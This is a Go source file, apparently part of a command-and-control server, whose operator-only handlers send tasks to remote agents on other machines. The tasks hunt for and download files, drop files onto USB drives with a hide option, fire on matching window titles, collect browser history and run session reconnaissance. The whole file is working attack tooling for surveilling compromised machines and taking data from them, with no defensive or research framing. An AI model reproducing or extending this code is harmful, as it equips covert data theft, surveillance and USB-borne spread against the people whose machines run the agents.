package server

import (
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

type fileHuntRequest struct {
	Path     string `json:"path" form:"path"`
	Pattern  string `json:"pattern" form:"pattern"`
	Command  string `json:"command" form:"command"`
	Download bool   `json:"download" form:"download"`
	MaxFiles int    `json:"max_files" form:"max_files"`
	MaxBytes int    `json:"max_bytes" form:"max_bytes"`
	MaxDepth int    `json:"max_depth" form:"max_depth"`
}

type usbDropRequest struct {
	Path   string `json:"path" form:"path"`
	Dest   string `json:"dest" form:"dest"`
	Command string `json:"command" form:"command"`
	Hide   bool   `json:"hide" form:"hide"`
}

type screenTriggerRequest struct {
	Match    string `json:"match" form:"match"`
	Command  string `json:"command" form:"command"`
	Interval int    `json:"interval" form:"interval"`
}

func bindJSONOrForm(c *gin.Context, dst any) {
	_ = c.ShouldBind(dst)
}

func (s *Server) handleFileHunt(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req fileHuntRequest
	bindJSONOrForm(c, &req)
	if req.Path == "" {
		req.Path = c.PostForm("path")
	}
	pattern := req.Pattern
	if pattern == "" {
		pattern = req.Command
	}
	if pattern == "" {
		pattern = c.PostForm("pattern")
	}
	if !req.Download {
		d := strings.ToLower(c.PostForm("download"))
		req.Download = d == "1" || d == "true" || d == "yes"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	var parts []string
	if req.Download {
		parts = append(parts, "download=1")
	}
	if req.MaxFiles > 0 {
		parts = append(parts, "max_files="+strconv.Itoa(req.MaxFiles))
	}
	if req.MaxBytes > 0 {
		parts = append(parts, "max_bytes="+strconv.Itoa(req.MaxBytes))
	}
	if req.MaxDepth > 0 {
		parts = append(parts, "max_depth="+strconv.Itoa(req.MaxDepth))
	}
	data := strings.Join(parts, ",")
	task, err := s.createTask(id, "file_hunt", pattern, "", req.Path, data, 0, 0, callerOpts(c)...)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	slog.Info("File hunt requested", "agent_id", id, "path", req.Path, "pattern", pattern, "download", req.Download)
	s.dispatchTask(c, task, "file_hunt", req.Path+" "+pattern)
}

func (s *Server) handleScreenTriggerStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req screenTriggerRequest
	bindJSONOrForm(c, &req)
	match := strings.TrimSpace(req.Match)
	if match == "" {
		match = strings.TrimSpace(req.Command)
	}
	if match == "" {
		match = strings.TrimSpace(c.PostForm("match"))
	}
	if match == "" {
		match = strings.TrimSpace(c.PostForm("command"))
	}
	if match == "" {
		respondError(c, http.StatusBadRequest, "window title match is required")
		return
	}
	if req.Interval <= 0 {
		if v := strings.TrimSpace(c.PostForm("interval")); v != "" {
			req.Interval, _ = strconv.Atoi(v)
		}
	}
	if req.Interval > 0 {
		match = fmt.Sprintf("%s,%d", match, req.Interval)
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "screen_trigger_start", match, "", "", "", 0, 0, callerOpts(c)...)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	s.dispatchTask(c, task, "screen_trigger_start", match)
}

func (s *Server) handleScreenTriggerStop(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"screen_trigger_stop", "screen_trigger_stop", "stop screen trigger"})
}

func (s *Server) handleUSBEnum(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"usb_enum", "usb_enum", "USB / volume enum"})
}

func (s *Server) handleUSBDrop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req usbDropRequest
	bindJSONOrForm(c, &req)
	src := strings.TrimSpace(req.Path)
	if src == "" {
		src = strings.TrimSpace(c.PostForm("path"))
	}
	if src == "" {
		respondError(c, http.StatusBadRequest, "usb_drop requires an explicit source path")
		return
	}
	dest := strings.TrimSpace(req.Dest)
	if dest == "" {
		dest = strings.TrimSpace(req.Command)
	}
	if dest == "" {
		dest = strings.TrimSpace(c.PostForm("dest"))
	}
	if dest == "" {
		dest = strings.TrimSpace(c.PostForm("command"))
	}
	data := ""
	if req.Hide {
		data = "hide=1"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "usb_drop", dest, "", src, data, 0, 0, callerOpts(c)...)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	s.LogAuditRecord(c, "usb_drop", "agent", id, "USB drop "+src+" -> "+dest, true, nil)
	s.dispatchTask(c, task, "usb_drop", src+" -> "+dest)
}

func (s *Server) handleBrowserHistory(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req struct {
		Browser string `json:"browser" form:"browser"`
		Command string `json:"command" form:"command"`
	}
	bindJSONOrForm(c, &req)
	browser := strings.TrimSpace(req.Browser)
	if browser == "" {
		browser = strings.TrimSpace(req.Command)
	}
	if browser == "" {
		browser = strings.TrimSpace(c.PostForm("browser"))
	}
	if browser == "" {
		browser = "all"
	}
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "browser_history", browser, "", "", "", 0, 0, callerOpts(c)...)
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to create task")
		return
	}
	s.dispatchTask(c, task, "browser_history", "Browser history: "+browser)
}

func (s *Server) handleSessionRecon(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"session_recon", "session_recon", "session recon"})
}
